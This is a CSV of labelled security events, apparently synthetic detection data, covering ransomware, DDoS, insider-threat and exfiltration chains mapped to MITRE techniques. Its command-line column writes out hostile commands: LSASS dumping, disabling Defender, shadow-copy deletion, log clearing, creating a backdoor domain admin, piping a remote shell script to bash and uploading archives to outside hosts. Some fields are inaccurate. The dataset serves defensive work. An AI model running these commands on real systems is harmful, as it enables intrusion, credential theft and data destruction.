"timestamp","event_id","attack_type","attack_stage","mitre_technique","source_system","source_ip","destination_ip","user","host","process_name","file_path","command_line","network_protocol","bytes_transferred","authentication_result","severity","fidelity_score","behavioral_score","anomaly_score","signature_match","asset_criticality","department","country","status","label"
"2025-01-15T02:14:23Z","EVT-100001","Ransomware","Initial Access","T1566.001","Email Gateway","203.0.113.47","10.20.15.142","jdavis","WKST-FIN-042","outlook.exe","C:\Users\jdavis\AppData\Local\Temp\invoice_2025.zip","outlook.exe /open invoice_2025.zip","SMTP","2847","Success","High","0.87","0.76","0.82","True","High","Finance","US","Active","Malicious"
"2025-01-15T02:18:47Z","EVT-100002","Ransomware","Execution","T1204.002","EDR","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","wscript.exe","C:\Users\jdavis\AppData\Local\Temp\invoice_2025.vbs","wscript.exe C:\Users\jdavis\AppData\Local\Temp\invoice_2025.vbs","None","0","Success","Critical","0.92","0.89","0.91","True","High","Finance","US","Active","Malicious"
"2025-01-15T02:19:15Z","EVT-100003","Ransomware","Defense Evasion","T1562.001","Windows Event Log","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring $true","None","0","Success","Critical","0.95","0.93","0.94","True","High","Finance","US","Active","Malicious"
"2025-01-15T02:21:33Z","EVT-100004","Ransomware","Credential Access","T1003.001","EDR","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","rundll32.exe","C:\Windows\System32\rundll32.exe","rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 612 C:\temp\lsass.dmp full","None","0","Success","Critical","0.96","0.91","0.95","True","High","Finance","US","Active","Malicious"
"2025-01-15T02:24:12Z","EVT-100005","Ransomware","Discovery","T1083","EDR","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe /c dir C:\ /s /b > C:\temp\files.txt","None","0","Success","Medium","0.68","0.72","0.64","False","High","Finance","US","Active","Malicious"
"2025-01-15T02:28:45Z","EVT-100006","Ransomware","Lateral Movement","T1021.002","Windows Event Log","10.20.15.142","10.20.18.56","jdavis","DC-01","smss.exe","C:\Windows\System32\smss.exe","C:\Windows\System32\PsExec.exe \\10.20.18.56 -u domain\admin -p P@ssw0rd cmd","SMB","1248","Success","Critical","0.91","0.88","0.89","True","Critical","IT","US","Active","Malicious"
"2025-01-15T02:32:18Z","EVT-100007","Ransomware","Collection","T1560.001","EDR","10.20.18.56","10.20.18.56","admin","DC-01","7z.exe","C:\Program Files\7-Zip\7z.exe","7z.exe a -p infected C:\exfil\sensitive.7z C:\Finance\* -r","None","0","Success","High","0.84","0.79","0.81","True","Critical","IT","US","Active","Malicious"
"2025-01-15T02:45:27Z","EVT-100008","Ransomware","Exfiltration","T1041","Firewall","10.20.18.56","185.220.101.42","admin","DC-01","curl.exe","C:\Windows\System32\curl.exe","curl.exe -X POST -F file=@C:\exfil\sensitive.7z https://transfer.sh/","HTTPS","428736512","Success","Critical","0.93","0.87","0.92","True","Critical","IT","US","Active","Malicious"
"2025-01-15T03:02:14Z","EVT-100009","Ransomware","Impact","T1486","EDR","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","lockbit.exe","C:\temp\lockbit.exe","lockbit.exe --encrypt --fast --network --exclude system32","None","0","Success","Critical","0.98","0.96","0.97","True","High","Finance","US","Active","Malicious"
"2025-01-15T03:03:45Z","EVT-100010","Ransomware","Impact","T1490","EDR","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","vssadmin.exe","C:\Windows\System32\vssadmin.exe","vssadmin.exe delete shadows /all /quiet","None","0","Success","Critical","0.97","0.94","0.96","True","High","Finance","US","Active","Malicious"
"2025-01-15T03:05:12Z","EVT-100011","Ransomware","Impact","T1491","EDR","10.20.15.142","10.20.15.142","jdavis","WKST-FIN-042","notepad.exe","C:\Windows\System32\notepad.exe","notepad.exe C:\Users\jdavis\Desktop\README_LOCKBIT.txt","None","0","Success","Critical","0.89","0.82","0.85","True","High","Finance","US","Active","Malicious"
"2025-01-15T03:08:33Z","EVT-100012","Ransomware","Command and Control","T1071.001","Firewall","10.20.15.142","198.51.100.73","jdavis","WKST-FIN-042","svchost.exe","C:\Windows\System32\svchost.exe","svchost.exe -k netsvcs","HTTPS","4752","Success","High","0.86","0.81","0.83","True","High","Finance","US","Active","Malicious"
"2025-01-22T14:23:11Z","EVT-100013","Ransomware","Initial Access","T1078.002","VPN Gateway","91.198.174.192","10.30.5.88","svc-backup","WKST-IT-015","openvpn.exe","C:\Program Files\OpenVPN\bin\openvpn.exe","openvpn.exe --config prod.ovpn","HTTPS","3214","Success","Medium","0.71","0.68","0.69","False","Medium","IT","DE","Active","Malicious"
"2025-01-22T14:28:44Z","EVT-100014","Ransomware","Privilege Escalation","T1548.002","EDR","10.30.5.88","10.30.5.88","svc-backup","WKST-IT-015","cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe /c powershell -Command Start-Process cmd -Verb RunAs","None","0","Success","High","0.83","0.77","0.79","True","Medium","IT","DE","Active","Malicious"
"2025-01-22T14:35:18Z","EVT-100015","Ransomware","Discovery","T1018","EDR","10.30.5.88","10.30.5.88","svc-backup","WKST-IT-015","net.exe","C:\Windows\System32\net.exe","net.exe view /domain","None","0","Success","Medium","0.64","0.61","0.58","False","Medium","IT","DE","Active","Malicious"
"2025-01-22T14:42:29Z","EVT-100016","Ransomware","Lateral Movement","T1570","EDR","10.30.5.88","10.30.5.92","svc-backup","FILE-SRV-02","robocopy.exe","C:\Windows\System32\Robocopy.exe","robocopy.exe C:\tools \\10.30.5.92\C$\temp /E","SMB","5287424","Success","High","0.78","0.74","0.76","True","High","IT","DE","Active","Malicious"
"2025-01-22T15:12:47Z","EVT-100017","Ransomware","Impact","T1486","EDR","10.30.5.92","10.30.5.92","svc-backup","FILE-SRV-02","blackcat.exe","C:\temp\blackcat.exe","blackcat.exe --access-token 7sDk2mP9xR4vL --paths C:\Data","None","0","Success","Critical","0.97","0.95","0.96","True","High","IT","DE","Active","Malicious"
"2025-01-22T15:14:22Z","EVT-100018","Ransomware","Command and Control","T1573.001","Firewall","10.30.5.92","104.21.47.228","svc-backup","FILE-SRV-02","blackcat.exe","C:\temp\blackcat.exe","blackcat.exe --c2 https://alphvpayment.onion","HTTPS","2847","Success","Critical","0.94","0.89","0.91","True","High","IT","DE","Active","Malicious"
"2025-02-03T09:15:33Z","EVT-100019","Ransomware","Initial Access","T1190","WAF","45.142.212.61","172.16.50.12","www-data","WEB-APP-01","apache2","C:\Program Files\Apache24\bin\httpd.exe","apache2 -k start","HTTPS","1247","Success","High","0.81","0.75","0.78","True","Critical","Engineering","SG","Active","Malicious"
"2025-02-03T09:18:42Z","EVT-100020","Ransomware","Execution","T1059.004","EDR","172.16.50.12","172.16.50.12","www-data","WEB-APP-01","bash","C:\cygwin\bin\bash.exe","bash -c curl http://45.142.212.61/shell.sh | bash","None","0","Success","Critical","0.92","0.88","0.89","True","Critical","Engineering","SG","Active","Malicious"
"2025-02-05T11:22:14Z","EVT-100021","DDoS","Reconnaissance","T1595.001","Firewall","203.0.113.89","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","8640","Failed","Low","0.42","0.38","0.41","False","Critical","Security","US","Active","Malicious"
"2025-02-05T11:22:15Z","EVT-100022","DDoS","Reconnaissance","T1595.001","Firewall","203.0.113.89","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","8640","Failed","Low","0.44","0.39","0.42","False","Critical","Security","US","Active","Malicious"
"2025-02-05T11:22:16Z","EVT-100023","DDoS","Reconnaissance","T1595.001","Firewall","203.0.113.89","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","8640","Failed","Low","0.43","0.40","0.43","False","Critical","Security","US","Active","Malicious"
"2025-02-05T11:22:17Z","EVT-100024","DDoS","Resource Development","T1583.006","Firewall","198.51.100.12","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","UDP","512","Failed","Low","0.45","0.41","0.44","False","Critical","Security","US","Active","Malicious"
"2025-02-05T11:23:01Z","EVT-100025","DDoS","Resource Development","T1583.006","Firewall","198.51.100.34","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","UDP","512","Failed","Low","0.46","0.42","0.45","False","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:42Z","EVT-100026","DDoS","Impact","T1498.001","Firewall","203.0.113.89","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","1048576","Failed","Critical","0.88","0.84","0.86","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:43Z","EVT-100027","DDoS","Impact","T1498.001","Firewall","198.51.100.12","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","1048576","Failed","Critical","0.89","0.85","0.87","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:43Z","EVT-100028","DDoS","Impact","T1498.001","Firewall","198.51.100.34","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","1048576","Failed","Critical","0.88","0.84","0.86","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:44Z","EVT-100029","DDoS","Impact","T1498.001","Firewall","45.142.212.78","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","1048576","Failed","Critical","0.90","0.86","0.88","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:44Z","EVT-100030","DDoS","Impact","T1498.001","Firewall","185.220.101.67","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","TCP","1048576","Failed","Critical","0.89","0.85","0.87","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:45Z","EVT-100031","DDoS","Impact","T1498.001","Load Balancer","203.0.113.89","172.16.10.5","anonymous","LB-WEB-01","N/A","N/A","N/A","TCP","2097152","Failed","Critical","0.91","0.87","0.89","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:46Z","EVT-100032","DDoS","Impact","T1498.002","Firewall","203.0.113.89","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","ICMP","65536","Failed","High","0.82","0.78","0.79","True","Critical","Security","US","Active","Malicious"
"2025-02-05T11:25:47Z","EVT-100033","DDoS","Impact","T1499.004","Firewall","198.51.100.12","172.16.10.5","anonymous","FW-EDGE-01","N/A","N/A","N/A","HTTP","524288","Failed","Critical","0.87","0.83","0.85","True","Critical","Security","US","Active","Malicious"
"2025-02-08T18:45:22Z","EVT-100034","DDoS","Impact","T1498.001","Firewall","91.198.174.45","10.50.20.8","anonymous","FW-DMZ-02","N/A","N/A","N/A","UDP","4194304","Failed","Critical","0.93","0.89","0.91","True","High","Security","UK","Active","Malicious"
"2025-02-08T18:45:23Z","EVT-100035","DDoS","Impact","T1498.001","Firewall","91.198.174.46","10.50.20.8","anonymous","FW-DMZ-02","N/A","N/A","N/A","UDP","4194304","Failed","Critical","0.92","0.88","0.90","True","High","Security","UK","Active","Malicious"
"2025-02-08T18:45:24Z","EVT-100036","DDoS","Impact","T1498.001","Firewall","91.198.174.47","10.50.20.8","anonymous","FW-DMZ-02","N/A","N/A","N/A","UDP","4194304","Failed","Critical","0.93","0.89","0.91","True","High","Security","UK","Active","Malicious"
"2025-02-10T22:14:33Z","EVT-100037","DDoS","Impact","T1499.002","Firewall","45.142.212.91","192.168.100.15","anonymous","FW-BRANCH-01","N/A","N/A","N/A","DNS","1048576","Failed","High","0.84","0.79","0.81","True","Medium","Security","CA","Active","Malicious"
"2025-02-10T22:14:34Z","EVT-100038","DDoS","Impact","T1499.002","Firewall","45.142.212.92","192.168.100.15","anonymous","FW-BRANCH-01","N/A","N/A","N/A","DNS","1048576","Failed","High","0.85","0.80","0.82","True","Medium","Security","CA","Active","Malicious"
"2025-02-10T22:14:35Z","EVT-100039","DDoS","Impact","T1499.002","Firewall","45.142.212.93","192.168.100.15","anonymous","FW-BRANCH-01","N/A","N/A","N/A","DNS","1048576","Failed","High","0.84","0.79","0.81","True","Medium","Security","CA","Active","Malicious"
"2025-02-12T15:28:47Z","EVT-100040","DDoS","Impact","T1499.003","WAF","104.21.47.156","172.16.10.5","anonymous","WAF-01","N/A","N/A","N/A","HTTP","8388608","Failed","Critical","0.90","0.86","0.88","True","Critical","Security","US","Active","Malicious"
"2025-01-18T23:45:12Z","EVT-100041","Insider Threat","Collection","T1005","DLP","10.20.25.67","10.20.25.67","mwilson","WKST-HR-022","excel.exe","C:\Program Files\Microsoft Office\Office16\EXCEL.EXE","excel.exe C:\HR\Payroll_2025_Complete.xlsx","None","0","Success","High","0.79","0.83","0.81","False","Critical","HR","US","Active","Malicious"
"2025-01-18T23:52:34Z","EVT-100042","Insider Threat","Collection","T1119","EDR","10.20.25.67","10.20.25.67","mwilson","WKST-HR-022","robocopy.exe","C:\Windows\System32\Robocopy.exe","robocopy.exe C:\HR D:\USB\HR_Backup /E /Z /COPY:DAT","None","0","Success","High","0.82","0.86","0.84","True","Critical","HR","US","Active","Malicious"
"2025-01-18T23:58:21Z","EVT-100043","Insider Threat","Exfiltration","T1052.001","USB Monitoring","10.20.25.67","10.20.25.67","mwilson","WKST-HR-022","explorer.exe","C:\Windows\explorer.exe","explorer.exe D:\","USB","2684354560","Success","Critical","0.91","0.94","0.92","True","Critical","HR","US","Active","Malicious"
"2025-01-19T00:05:47Z","EVT-100044","Insider Threat","Defense Evasion","T1070.004","Windows Event Log","10.20.25.67","10.20.25.67","mwilson","WKST-HR-022","wevtutil.exe","C:\Windows\System32\wevtutil.exe","wevtutil.exe cl Security","None","0","Success","Critical","0.88","0.91","0.89","True","Critical","HR","US","Active","Malicious"
"2025-01-25T02:18:33Z","EVT-100045","Insider Threat","Initial Access","T1078.003","VPN Gateway","78.47.151.29","10.40.12.88","dbrown","VPN-01","openvpn.exe","C:\Program Files\OpenVPN\bin\openvpn.exe","openvpn.exe --config remote.ovpn","HTTPS","2841","Success","Medium","0.67","0.71","0.68","False","Medium","Engineering","JP","Active","Malicious"
"2025-01-25T02:24:18Z","EVT-100046","Insider Threat","Collection","T1114.002","Exchange Server","10.40.12.88","10.40.1.25","dbrown","EXCH-01","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe -Command Search-Mailbox -Identity CEO -SearchQuery subject:confidential -TargetMailbox dbrown -TargetFolder Backup","None","0","Success","High","0.84","0.88","0.85","True","Critical","Engineering","JP","Active","Malicious"
"2025-01-25T02:35:42Z","EVT-100047","Insider Threat","Exfiltration","T1567.002","Proxy","10.40.12.88","151.101.1.140","dbrown","WKST-ENG-156","chrome.exe","C:\Program Files\Google\Chrome\Application\chrome.exe","chrome.exe --app=https://drive.google.com","HTTPS","734003200","Success","Critical","0.89","0.92","0.90","True","Medium","Engineering","JP","Active","Malicious"
"2025-02-01T16:42:11Z","EVT-100048","Insider Threat","Credential Access","T1555.003","EDR","10.30.8.44","10.30.8.44","tjohnson","WKST-FIN-087","chrome.exe","C:\Program Files\Google\Chrome\Application\chrome.exe","chrome.exe --load-extension=C:\temp\creds_export","None","0","Success","High","0.81","0.85","0.82","True","High","Finance","AU","Active","Malicious"
"2025-02-01T16:48:27Z","EVT-100049","Insider Threat","Discovery","T1087.002","Active Directory","10.30.8.44","10.30.1.10","tjohnson","DC-02","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Get-ADUser -Filter * -Properties * | Export-Csv C:\temp\users.csv","LDAP","0","Success","Medium","0.72","0.76","0.73","False","High","Finance","AU","Active","Malicious"
"2025-02-01T17:05:14Z","EVT-100050","Insider Threat","Exfiltration","T1048.003","Firewall","10.30.8.44","13.107.42.14","tjohnson","WKST-FIN-087","onedrive.exe","C:\Program Files\Microsoft OneDrive\OneDrive.exe","onedrive.exe --upload C:\temp\users.csv","HTTPS","128547","Success","High","0.79","0.83","0.80","True","High","Finance","AU","Active","Malicious"
"2025-02-06T08:15:22Z","EVT-100051","Insider Threat","Persistence","T1136.001","Active Directory","10.20.5.33","10.20.1.5","admin_temp","DC-01","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe New-ADUser -Name backdoor_svc -AccountPassword (ConvertTo-SecureString P@ssw0rd! -AsPlainText -Force) -Enabled $true","LDAP","0","Success","Critical","0.92","0.95","0.93","True","Critical","IT","US","Active","Malicious"
"2025-02-06T08:22:45Z","EVT-100052","Insider Threat","Privilege Escalation","T1098","Active Directory","10.20.5.33","10.20.1.5","admin_temp","DC-01","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Add-ADGroupMember -Identity Domain Admins -Members backdoor_svc","LDAP","0","Success","Critical","0.94","0.96","0.94","True","Critical","IT","US","Active","Malicious"
"2025-02-07T19:34:18Z","EVT-100053","Insider Threat","Collection","T1213.002","SharePoint","10.50.15.72","10.50.5.10","klee","SP-01","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Connect-PnPOnline -Url https://intranet.company.com -UseWebLogin; Get-PnPFile -Url /Shared Documents/Strategic_Plans_2025.docx -Path C:\temp -AsFile","HTTPS","4587520","Success","High","0.83","0.87","0.84","True","High","Marketing","SG","Active","Malicious"
"2025-02-07T19:41:52Z","EVT-100054","Insider Threat","Exfiltration","T1041","Firewall","10.50.15.72","185.220.101.89","klee","WKST-MKT-044","python.exe","C:\Python39\python.exe","python.exe C:\temp\exfil.py --file C:\temp\Strategic_Plans_2025.docx --server 185.220.101.89","HTTPS","4587520","Success","Critical","0.87","0.90","0.88","True","High","Marketing","SG","Active","Malicious"
"2025-02-09T13:28:16Z","EVT-100055","Insider Threat","Impact","T1485","EDR","10.20.35.91","10.20.35.91","disgruntled_dev","WKST-ENG-203","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Remove-Item -Path C:\Projects\* -Recurse -Force","None","0","Success","Critical","0.76","0.79","0.77","False","High","Engineering","US","Active","Malicious"
"2025-02-09T13:32:44Z","EVT-100056","Insider Threat","Impact","T1491.001","EDR","10.20.35.91","10.20.35.91","disgruntled_dev","WKST-ENG-203","cmd.exe","C:\Windows\System32\cmd.exe","cmd.exe /c echo Goodbye cruel world > C:\inetpub\wwwroot\index.html","None","0","Success","High","0.74","0.77","0.75","False","High","Engineering","US","Active","Malicious"
"2025-02-11T21:47:33Z","EVT-100057","Insider Threat","Collection","T1039","EDR","192.168.50.23","192.168.50.23","contractor_ext","WKST-EXT-009","xcopy.exe","C:\Windows\System32\xcopy.exe","xcopy.exe \\FILE-SRV-01\Engineering\* C:\temp\backup /E /H /C /I","SMB","1573741824","Success","Medium","0.69","0.73","0.70","False","Medium","External","IN","Active","Malicious"
"2025-02-11T22:15:28Z","EVT-100058","Insider Threat","Defense Evasion","T1564.001","EDR","192.168.50.23","192.168.50.23","contractor_ext","WKST-EXT-009","attrib.exe","C:\Windows\System32\attrib.exe","attrib.exe +h C:\temp\backup","None","0","Success","Low","0.58","0.62","0.59","False","Medium","External","IN","Active","Malicious"
"2025-02-12T10:22:55Z","EVT-100059","Insider Threat","Exfiltration","T1030","Email Gateway","10.20.25.67","209.85.202.27","mwilson","SMTP-01","outlook.exe","C:\Program Files\Microsoft Office\Office16\OUTLOOK.EXE","outlook.exe /send mailto:personal@gmail.com?subject=Backup&attachment=C:\temp\sensitive.zip","SMTP","52428800","Success","High","0.85","0.88","0.86","True","Critical","HR","US","Active","Malicious"
"2025-02-13T14:38:41Z","EVT-100060","Insider Threat","Collection","T1530","Cloud Logs","10.40.18.55","13.107.42.14","svc-automation","N/A","az.exe","C:\Program Files\Azure CLI\az.exe","az storage blob download-batch --account-name prodbackups --source backups --destination C:\temp\cloud_data","HTTPS","3221225472","Success","Medium","0.71","0.75","0.72","False","High","IT","US","Active","Malicious"
"2025-01-20T10:32:18Z","EVT-100061","Data Exfiltration","Discovery","T1083","EDR","10.20.45.82","10.20.45.82","rthomas","WKST-FIN-128","powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe Get-ChildItem -Path C:\ -Include *.xlsx,*.docx,*.pdf -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,Length | Export-Csv C:\temp\files.csv","None","0","Success","Medium","0.68","0.72","0.69","False","High","Finance","US","Active","Malicious"
"2025-01-20T10:45:27Z","EVT-100062","Data Exfiltration","Collection","T1560.001","EDR","10.20.45.82","10.20.45.82","rthomas","WKST-FIN-128","7z.exe","C:\Program Files\7-Zip\7z.exe","7z.exe a -tzip -pSecure2025! C:\temp\financial_data.zip C:\Finance\Q4_Results.xlsx C:\Finance\Budget_2025.xlsx","None","0","Success","High","0.81","0.85","0.82","True","High","Finance","US","Active","Malicious"
"2025-01-20T10:52:44Z","EVT-100063","Data Exfiltration","Command and Control","T1071.001","Firewall","10.20.45.82","151.101.1.140","rthomas","WKST-FIN-128","chrome.exe","C:\Program Files\Google\Chrome\Application\chrome.exe","chrome.exe https://drive.google.com","HTTPS","2847","Success","Low","0.52","0.56","0.53","False","High","Finance","US","Active","Benign"
"2025-01-20T11:08:15Z","EVT-100064","Data Exfiltration","Exfiltration","T1567.002","Proxy","10.20.45.82","151.101.1.140","rthomas","WKST-FIN-128","chrome.exe","C:\Program Files\Google\Chrome\Application\chrome.exe","chrome.exe --upload C:\temp\financial_data.zip","HTTPS","1879048192","Success","Critical","0.93","0.96","0.94","True","High","Finance","US","Active","Malicious"
"2025-01-26T15:22:39Z","EVT-100065","Data Exfiltration","Credential Access","T1003.001","EDR","10.30.12.44","10.30.12.44","attacker","WKST-IT-077","procdump.exe","C:\temp\procdump.exe","procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp","None","0","Success","Critical","0.95","0.97","0.95","True","Medium","IT","UK","Active","Malicious"
"2025-01-26T15:28:52Z","EVT-100066","Data Exfiltration","Discovery","T1087.002","Active Directory","10.30.12.44","10.30.1.15","attacker","DC-03","ldapsearch","C:\Program Files\OpenLDAP\ldapsearch.exe","ldapsearch -x -h 10.30.1.15 -b dc=company,dc=com (objectClass=user)","LDAP","0","Success","Medium","0.73","0.77","0.74","False","Medium","IT","UK","Active","Malicious"
"2025-01-26T15:42:16Z","EVT-100067","Data Exfiltration","Collection","T1039","EDR","10.30.12.44","10.30.50.20","attacker","FILE-SRV-03","robocopy.exe","C:\Windows\System32\Robocopy.exe","robocopy.exe \\10.30.50.20\SharedDocs C:\exfil\docs /E /COPY:DAT /R:0 /W:0","SMB","5368709120","Success","High","0.87","0.90","0.88","True","Critical","IT","UK","Active","Malicious"
"2025-01-26T16:15:33Z","EVT-100068","Data Exfiltration","Exfiltration","T1048.003","Firewall","10.30.12.44","13.107.42.14","attacker","WKST-IT-077","rclone.exe","C:\temp\rclone.exe","rclone.exe copy C:\exfil\docs onedrive:exfil --transfers 8","HTTPS","5368709120","Success","Critical","0.91","0.94","0.92","True","Medium","IT","UK","Active","Malicious"
"2025-01-29T08:18:24Z","EVT-100069","Data Exfiltration","Initial Access","T1133","VPN Gateway","198.51.100.78","10.50.8.92","vpn_user","VPN-02","openvpn.exe","C:\Program Files\OpenVPN\bin\openvpn.exe","openvpn.exe --config prod.ovpn","HTTPS","3214","Success","Low","0.48","0.52","0.49","False","Low","IT","CN","Active","Benign"
"2025-01-29T08:25:47Z","EVT-100070","Data Exfiltration","Discovery","T1046","EDR","10.50.8.92","10.50.1.0","vpn_user","WKST-EXT-022","nmap.exe","C:\Program Files\Nmap\nmap.exe","nmap.exe -sV -p 445,3389,22 10.50.1.0/24","None","0","Success","High","0.82","0.86","0.83","True","Low","IT","CN","Active","Malicious"
"2025-01-29T08:42:31Z","EVT-100071","Data Exfiltration","Lateral Movement","T1021.001","Windows Event Log","10.50.8.92","10.50.15.88","vpn_user","APP-SRV-01","mstsc.exe","C:\Windows\System32\mstsc.exe","mstsc.exe /v:10.50.15.88","RDP","0","Success","Medium","0.67","0.71","0.68","False","Low","IT","CN","Active","Malicious"
"2025-01-29T09:12:18Z","EVT-100072","Data Exfiltration","Collection","T1005","EDR","10.50.15.88","10.50.15.88","vpn_user","APP-SRV-01","sqlcmd.exe","C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe","sqlcmd.exe -S localhost -Q SELECT * FROM Customers INTO OUTFILE C:\temp\customers.csv","None","0","Success","High","0.84","0.87","0.85","True","Critical","IT","CN","Active","Malicious"
